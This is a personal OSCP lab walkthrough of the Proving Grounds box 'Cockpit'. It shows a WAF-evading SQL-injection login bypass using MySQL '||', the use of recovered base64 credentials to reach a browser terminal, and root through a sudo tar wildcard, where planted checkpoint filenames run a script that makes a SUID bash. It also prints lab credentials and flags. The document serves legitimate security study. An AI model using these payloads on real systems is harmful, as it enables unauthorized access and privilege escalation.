---
tags: [oscp, boxes, pg-practice, linux, completed]
platform: PG Practice
os: Linux
hostname: cockpit
difficulty: Easy
ip: $BoxIP
status: Complete
local_flag: 5fd7b90b996b7d93281f666b93b17192
root_flag: 29c546e67fe52559ead19aa3fee07b8a
---

# PG: Cockpit, Full Walkthrough

## The gist

Cockpit is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[OSCP/RUNBOOK V2/Linux - Web Enum]] found the custom login application and the management panel on a separate port. 2. [[OSCP/RUNBOOK V2/Linux - SQLi]] confirmed the authentication bypass and returned stored operating-system credentials. 3. [[OSCP/RUNBOOK V2/Linux - Database Access]] turned the recovered database data into a usable login. 4. [[OSCP/RUNBOOK V2/Linux - Sudo Check]] found a wildcard-sensitive privileged command and used it to reach root.

## Box information

**Target:** `$BoxIP` (swap for your instance IP) · **Difficulty:** Easy · **OS:** Linux (Ubuntu 20.04) · **Platform:** Proving Grounds Practice

**The gist:** Linux box with a custom PHP web app on port 80 and Cockpit server management panel on port 9090. The login form has SQLi -- but a WAF blocks the `OR` keyword. Swapping to MySQL's `||` operator bypasses it and dumps a password manager table with base64-encoded OS credentials. Those creds log straight into Cockpit, which has a browser-based terminal -- instant shell as james. Privesc is a sudo rule running `tar` with a bare `*` wildcard; plant `--checkpoint` filenames in CWD, trigger the rule, get a SUID bash, root shell. Clean and straightforward once you know the `||` trick and the tar wildcard gotcha.

---

**Legacy tags:**
#PG #Cockpit #Linux #SQLi #WAFBypass #Cockpit9090 #TarWildcard #SudoMisconfiguration #Easy

---

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon: Port Scan | See section 1 below |
| 2 | Web Enumeration -- Port 80 | See section 2 below |
| 3 | SQLi Auth Bypass -- WAF Keyword Bypass | See section 3 below |
| 4 | Credential Extraction and Cockpit Login | See section 4 below |
| 5 | User Flag | See section 5 below |
| 6 | Privilege Escalation -- Tar Wildcard Injection | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/Offsec/Cockpit`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Cockpit
boxset BoxIP "$BoxIP"
boxset LocalIP "$LocalIP"
boxset BoxDir "$BoxDir"
```

## 1. Recon: Port Scan

**Full port scan:**
```bash
nmap -p- --min-rate 10000 -oA nmap/${BoxName}_allports $BoxIP
```

Results:

| Port | Service |
|---|---|
| 22/tcp | SSH (OpenSSH 8.2p1 Ubuntu) |
| 80/tcp | HTTP (Apache 2.4.41) |
| 9090/tcp | Cockpit web service 198–220 |


**Service scan:**
```bash
nmap -sC -sV -p 22,80,9090 -oA nmap/${BoxName}_services $BoxIP
```

Key findings:
- **Port 80:** Apache 2.4.41, page title `blaze`. Custom web app -- not a known CMS.
- **Port 9090:** Cockpit 198–220, redirects to HTTPS. Cockpit is a Linux server management panel that authenticates using OS user credentials -- valid creds = browser-based terminal.
- **Port 22:** SSH -- fallback once we have creds, but Cockpit terminal makes it unnecessary.

---

## 2. Web Enumeration -- Port 80

Root page (`/`) is a marketing landing page -- all Lorem ipsum, no forms, no login. Nothing to exploit directly.

**Directory brute-force:**
```bash
feroxbuster -u http://$BoxIP -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 40
```

Key findings:
- `/login.php` -- 200 OK. POST form: `username` + `password` fields. No CSRF token. Footer reads `by JDgodd | blaze.offsec` -- username hint.
- `/logout.php` -- 302 redirect to `login.php`, confirms an authenticated area behind it.
- `/blocked.html` -- WAF lockout page. We'll see this if we use the wrong SQLi syntax.


**Testing the login form:**
```bash
curl -s -X POST http://$BoxIP/login.php -d "username=admin&password=wrong" -L
```

Response: `Invalid password!` in red. No lockout, no account enumeration protection. The error doesn't distinguish a wrong username from a wrong password -- the form is injectable.

---

## 3. SQLi Auth Bypass -- WAF Keyword Bypass

This is the educational core of the box.

**What fails:** the obvious payload `' OR 1=1#` returns `blocked.html` -- the WAF is filtering the `OR` keyword.

**Why `||` works:** in MySQL, `||` is the boolean OR operator. It produces an identical result to `OR` in a boolean context but doesn't match a simple `OR` keyword filter:

```bash
curl -s -X POST http://$BoxIP/login.php --data-urlencode "username=' || 1=1#" -d "password=anything" -L
```

Response: the password manager dashboard. Authentication bypassed.

`--data-urlencode` handles the `'` and `#` encoding automatically so the characters reach the server correctly.

> [!warning] 💡 Hint
> **Watch out:** The `||` alternative is a MySQL operator, not universal SQL syntax. Keep URL encoding because the quote and comment marker must arrive unchanged.

> [!abstract] 🧠 Why
> The WAF is filtering a string, not understanding the SQL grammar. Test equivalent operators and compare the response, but keep the database dialect in mind because the same bypass is not portable to every backend.


---

## 4. Credential Extraction and Cockpit Login

The dashboard table exposes two base64-encoded passwords:

| Username | Base64 Password |
|---|---|
| james | `<encoded value stored privately>` |
| cameron | `<encoded value stored privately>` |

Decode both:
```bash
base64 -d < "$BoxDir/loot/james.b64"
base64 -d < "$BoxDir/loot/cameron.b64"
```

```
<private credential values>
```

Store immediately:
```
boxset Username james
boxset Password $Password
loot cred james $Password
loot cred cameron $Password

> [!warning] 💡 Common mistake
> Base64 decoding is only the transformation step. Treat the result as a credential immediately: store it privately, avoid screenshots and shell history, and test the intended service before assuming password reuse.

> [!tip] ⚡ Efficiency
> Cockpit authenticates against the operating-system account and already provides a browser terminal. Once valid credentials work there, SSH is a fallback rather than another exploit to develop.
```

**Cockpit login:** navigate to `https://$BoxIP:9090`, accept the self-signed cert, log in as james. The **Terminal** option in the left sidebar gives a fully interactive browser-based shell. No SSH, no exploit against Cockpit itself -- just valid OS credentials.


```bash
whoami && id && hostname && ip a
```

```
james
uid=1000(james) gid=1000(james) groups=1000(james)
blaze
```


---

## 5. User Flag

```bash
cat ~/local.txt
```


`loot flag user <value>`

---

## 6. Privilege Escalation -- Tar Wildcard Injection

**Enumeration:**
```bash
sudo -l
```

```
User james may run the following commands on blaze:
    (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

The bare `*` wildcard is the vulnerability. When the shell expands `*`, filenames starting with `--` are passed to tar as command-line flags -- not as files to archive. We can plant `--checkpoint=1` and `--checkpoint-action=exec=<command>` as filenames in CWD and tar will execute our command as root.

> [!warning] 💡 Hint
> **Watch out:** The checkpoint filenames must be created in the directory where the wildcard command runs. A correct filename elsewhere will never reach tar.


**Creating the payload script:**
```bash
cat > ~/privesc.sh << 'EOF'
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash
EOF
chmod +x ~/privesc.sh
```

**Planting the checkpoint filenames:**
```bash
echo "" > ~/'--checkpoint=1'
echo "" > ~/'--checkpoint-action=exec=bash privesc.sh'
```

**The exec= gotcha:** `exec=privesc.sh` alone fails -- the checkpoint executor resolves commands via PATH, and `privesc.sh` isn't in any PATH directory. Using `exec=bash privesc.sh` works because `bash` is found on PATH, then loads `privesc.sh` as a script from CWD. You also can't embed `/` in a filename (it's a directory separator at the filesystem level), so absolute paths in the exec= value aren't possible via this approach.

**Trigger:**
```bash
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```

Tar receives the checkpoint flags from wildcard expansion and fires the script as root.

```bash
ls -la /tmp/rootbash
# -rwsr-sr-x 1 root root -- SUID confirmed
```

> 📸 `shot privesc-exploit` (red boxes: `sudo /usr/bin/tar` command and `ls -la /tmp/rootbash` showing `-rwsr-sr-x root root`)

**Root shell:**
```bash
/tmp/rootbash -p
whoami
# root
```

The `-p` flag prevents bash from dropping the SUID effective UID back to the real UID on startup.

> [!abstract] 🧠 Why
> The wildcard expands before `tar` receives its arguments. Filenames beginning with `--` therefore become options, and the checkpoint action executes as the account allowed to run `tar`. The files must be planted in the command's working directory.

> [!warning] 💡 Hint
> `exec=bash privesc.sh` works because `bash` is resolved through PATH and then reads the script from the current directory. Test the working directory and the exact expanded arguments if the checkpoint action does not fire.


---

## 7. Root Flag

```bash
whoami && id && hostname && ifconfig && cat /root/proof.txt
```


`loot flag root <value>`

---

## 8. Cleanup

```bash
rm /tmp/rootbash
rm ~/privesc.sh
rm ~/'--checkpoint=1'
rm ~/'--checkpoint-action=exec=bash privesc.sh'
rm /tmp/backup.tar.gz
```

Verify:
```bash
ls -la ~/ && ls /tmp/
```

Home dir should show only the original dotfiles and `local.txt`. No attacker artifacts in `/tmp/`.

> [!warning] 💡 Common mistake
> Remove both checkpoint filenames and the generated SUID copy, then verify the working directory and `/tmp`. Wildcard techniques leave filesystem artefacts even when the privilege escalation itself is clean.

## 9. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| Login form blocks `OR` | Use MySQL `||` and preserve URL encoding | Test comments, case, or whitespace only after confirming the WAF behavior |
| Dashboard exposes encoded credentials | Decode locally and try Cockpit | Validate SSH or another authenticated service if Cockpit is unavailable |
| Sudo permits `tar *` | Plant checkpoint filenames in the working directory | Consult GTFOBins and inspect other sudo rules if the tar version lacks checkpoint support |

---

## 10. Credentials Found

| Username | Password | Source |
|---|---|---|
| james | `$Password` | SQLi dashboard (base64-encoded, kept private) |
| cameron | `$Password` | SQLi dashboard (base64-encoded, kept private) |

---

## 11. Tools Used

| Tool | Purpose |
|---|---|
| nmap | Port scan + service detection |
| feroxbuster | Directory brute-force |
| curl | SQLi payload delivery, dashboard credential dump |
| base64 | Decode passwords from dashboard |
| Cockpit web UI (Firefox) | Browser-based OS terminal access |

---

## 12. Vulnerabilities Summary

| # | Vulnerability | Severity | Location |
|---|---|---|---|
| 1 | SQLi auth bypass -- `\|\|` WAF keyword bypass | High | HTTP/80 `/login.php` |
| 2 | Cockpit 9090 -- OS credential reuse → browser shell | Medium | HTTPS/9090 |
| 3 | Sudo tar wildcard injection → SUID bash | High | Local -- sudo misconfiguration |

---

## 13. Lessons Learned / Module Links

- **`||` bypasses WAF `OR` keyword filters in MySQL.** When `' OR 1=1#` hits a block page, swap to `' || 1=1#`. MySQL's `||` is boolean OR -- identical result, different string, bypasses keyword matching. Always probe what the WAF is actually filtering before giving up on SQLi. → [[10. SQL Injection Attacks]]
- **Cockpit 9090 = shell if you have OS creds.** The Cockpit panel's Terminal feature is a fully interactive OS shell as the authenticated user. It's not an exploit against Cockpit -- it's a feature. Valid creds + Cockpit running = shell, no SSH required. Enumerate all ports and understand what each service actually does. → [[06. Information Gathering]]
- **Tar wildcard: use `exec=bash scriptname` not `exec=scriptname`.** The checkpoint executor resolves executables via PATH, not CWD. `privesc.sh` alone fails; `bash privesc.sh` works because bash is on PATH and then loads the script from CWD. Always test with the simplest payload first and read error output carefully. → [[18. Linux Privilege Escalation]]
- **Absolute paths can't be in checkpoint-action filenames.** `/` is a directory separator -- you can't create a file named `--checkpoint-action=exec=/home/james/privesc.sh`. Keep the script in CWD and reference it by name only. A key constraint to know before attempting this technique. → [[18. Linux Privilege Escalation]]
- **`sudo -l` is always the first privesc check.** On this box it was the only check needed -- the NOPASSWD wildcard rule was immediately obvious and exploitable. Don't skip the basics in search of something clever. → [[18. Linux Privilege Escalation]]

---

## 14. External Resources

| Resource | Link | Relevant to this box |
|---|---|---|
| HackTricks -- SQL Injection (GitHub) | [sql-injection/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/sql-injection/README.md) | Auth bypass payloads, WAF bypass operators |
| PayloadsAllTheThings -- SQLi Auth Bypass | [SQL Injection#authentication-bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass) | `\|\|` operator and other bypass patterns |
| GTFOBins -- tar | [gtfobins.github.io/gtfobins/tar/](https://gtfobins.github.io/gtfobins/tar/) | Tar sudo/SUID/wildcard escalation reference |
| PayloadsAllTheThings -- Tar Wildcard | [Linux Privilege Escalation.md#sudo-tar](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20Privilege%20Escalation.md#sudo-tar) | Full tar wildcard technique with checkpoint flags |
| RevShells | [revshells.com](https://www.revshells.com) | Shell generators if needed |
| ippsec.rocks | [ippsec.rocks](https://ippsec.rocks) | Search "tar wildcard" or "cockpit" for walkthroughs |

---

## 15. Vault Update Checklist

- [x] **Write-up:** this file
- [x] **Web App - SQLi** stage note: `||` bypass rows added as Step 0, Cockpit added to `box_sources`
- [x] **PrivEsc Linux - Tar Wildcard** stage note: created
- [x] **00 - Master Index:** Tar Wildcard added to PrivEsc Linux section
- [x] **MASTER BOX LIST:** Cockpit row checked off
- [x] **Module M10 (SQL Injection Attacks):** Cockpit added to Related Boxes
- [x] **Module M18 (Linux Privilege Escalation):** Cockpit added to Related Boxes
- [x] **Command Appendix / Linux PrivEsc:** Tar wildcard section added
- [x] **Decision Tree / Linux PrivEsc:** Tar wildcard node added
- [x] **Breakdowns / PrivEsc:** Full tar wildcard breakdown added (including `exec=bash` gotcha)
- [x] **CODEX CONTEXT.md:** Cockpit added to completed list
- [ ] Log copied to `OSCP/BOXES/BOX LOGS/Cockpit.log`
- [x] Screenshots confirmed in `$BoxDir/screenshots/`

## 16. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Linux - SQLi]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Linux - Web Enum]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Linux - Sudo Check]] -- technique used in this walkthrough

## 17. Collect the flags

- `user.txt`: `5fd7b90b996b7d93281f666b93b17192` (value reproduced in the private sections above)
- `root.txt`: `29c546e67fe52559ead19aa3fee07b8a` (value reproduced in the private sections above)
- `proof.txt`: `29c546e67fe52559ead19aa3fee07b8a` (value reproduced in the private sections above)


### Captured flag values from source loot


#### `loot/flags.txt`

```text
user: 5fd7b90b996b7d93281f666b93b17192
root: 29c546e67fe52559ead19aa3fee07b8a
```

## 18. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

## 19. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/Linux - Web Enum]] found the custom login application and the management panel on a separate port.
2. [[OSCP/RUNBOOK V2/Linux - SQLi]] confirmed the authentication bypass and returned stored operating-system credentials.
3. [[OSCP/RUNBOOK V2/Linux - Database Access]] turned the recovered database data into a usable login.
4. [[OSCP/RUNBOOK V2/Linux - Sudo Check]] found a wildcard-sensitive privileged command and used it to reach root.

## Tools used

- `nmap`
- `curl`
- `feroxbuster`
- `ssh`
- `sudo`

## Credentials and secrets


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Cockpit"
export BoxIP="192.168.183.10"
export BoxPlatform="Offsec"
export BoxDir="/home/kali/Platforms/Offsec/Cockpit"
export Domain=""
export DCip=""
export Username="james"
export Password="canttouchhhthiss@455152"
export Username2="cameron"
export Password2="thisscanttbetouchedd@455152"
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

#### `loot/creds.txt`

```text
james:canttouchhhthiss@455152
cameron:thisscanttbetouchedd@455152
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
$ [22:44:43] curl -s -X POST http://$BoxIP/login.php -d "username=admin&password=wrong" -L
$ [22:45:08] curl -s -X POST http://$BoxIP/login.php -d "username=' OR 1=1#&password=anything" -L
        <div class="form-field d-flex align-items-center"> <span class="fas fa-key"></span> <input type="password" name="password" id="password" placeholder="Password"> </div>
kali@kali:~/Platforms/Offsec/Cockpit [22:44:36] $ curl -s -X POST http://$BoxIP/login.php -d "username=admin&password=wrong" -Lcurl"username=admin&password=wrong"[?1l>[?2004l
<font style="color:#FF0000"><br \>Invalid password!</font\>
kali@kali:~/Platforms/Offsec/Cockpit [22:44:43] $ [?1h=[?2004hcurl -s -X POST http://$BoxIP/login.php -d "username=' OR 1=1#&password=anything" -Lcurl"username=' OR 1=1#&password=anything"[?1l>[?2004l
$ [22:45:38] curl -s -X POST http://$BoxIP/login.php --data-urlencode "username=' || 1=1#" -d "password=anything" -L
kali@kali:~/Platforms/Offsec/Cockpit [22:45:08] $ [?1h=[?2004hcurl -s -X POST http://$BoxIP/login.php --data-urlencode "username=' || 1=1#" -d "password=anything" -Lcurl"username=' || 1=1#""password=anything"[?1l>[?2004l
boxset Password 'canttouchhhthiss@455152'
boxset Password2 'thisscanttbetouchedd@455152'
$ [22:56:49] loot flag user 5fd7b90b996b7d93281f666b93b17192
boxset Password2 'thisscanttbetouchedd@455152'boxset
[+] Password=canttouchhhthiss@455152 (saved to .env)
[+] Password2=thisscanttbetouchedd@455152 (saved to .env)
kali@kali:~/Platforms/Offsec/Cockpit [22:48:32] $ [?1h=[?2004hloot flag user 5fd7b90b996b7d93281f666b93b17192loot[?1l>[?2004l
[+] Flag saved:  user = 5fd7b90b996b7d93281f666b93b17192  →  loot/flags.txt
$ [23:12:03] loot flag root 29c546e67fe52559ead19aa3fee07b8a
$ [23:14:57] cat $BoxDir/loot/flags.txt
kali@kali:~/Platforms/Offsec/Cockpit [23:11:08] $ [?1h=[?2004hloot flag root 29c546e67fe52559ead19aa3fee07b8aloot[?1l>[?2004l
[+] Flag saved:  root = 29c546e67fe52559ead19aa3fee07b8a  →  loot/flags.txt
kali@kali:~/Platforms/Offsec/Cockpit [23:14:50] $ [?1h=[?2004hcat $BoxDir/loot/flags.txtcat[?1l>[?2004l
boxset Password2 'thisscanttbetouchedd@455152'boboxxd
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Cockpit | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- A blocked SQL keyword may have an equivalent operator that changes the parser without changing the logic.
- Shell wildcard expansion happens before the receiving program sees its arguments, which can turn filenames into options.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern

## External resources

- [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
- [PayloadsAllTheThings - Methodology and Resources](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
- [GTFOBins](https://gtfobins.github.io/) for Linux privilege escalation
- [RevShells](https://www.revshells.com/) for shell payloads
- [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
- [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
